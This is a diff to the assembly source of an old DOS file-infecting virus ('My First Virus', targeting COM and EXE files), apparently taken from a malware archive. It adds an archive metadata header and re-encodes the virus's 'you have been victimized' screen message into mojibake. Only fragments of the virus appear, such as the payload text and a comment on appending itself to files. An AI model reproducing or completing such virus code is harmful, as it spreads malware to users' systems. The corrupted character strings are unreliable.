@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      J
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ;******************************************************************
 ;*                                                                *
 ;*     My First Virus, a simple non-overwriting COM and EXE       *
@@ -408,12 +419,12 @@ PRINTLOOP:        mov ah,2h                     ; BIOS set cursor
 
 BOMB_DONE:        jmp QUIT                      ; Go back to host program
 
-VERSE:  db  'ÖÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ·$'
-        db  'º  Guess what ???                                   º$'
-        db  'º     You have been victimized by a virus!!! Do not º$'
-        db  'º     try to reboot your computer or even turn it   º$'
-        db  'º     off.  You might as well read this and weep!   º$'
-        db  'ÓÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ½',7,7,'$'
+VERSE:  db  'ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä·$'
+        db  'ï¿½  Guess what ???                                   ï¿½$'
+        db  'ï¿½     You have been victimized by a virus!!! Do not ï¿½$'
+        db  'ï¿½     try to reboot your computer or even turn it   ï¿½$'
+        db  'ï¿½     off.  You might as well read this and weep!   ï¿½$'
+        db  'ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä½',7,7,'$'
 
 ; Write routine to append the virus to the end of the file.
 
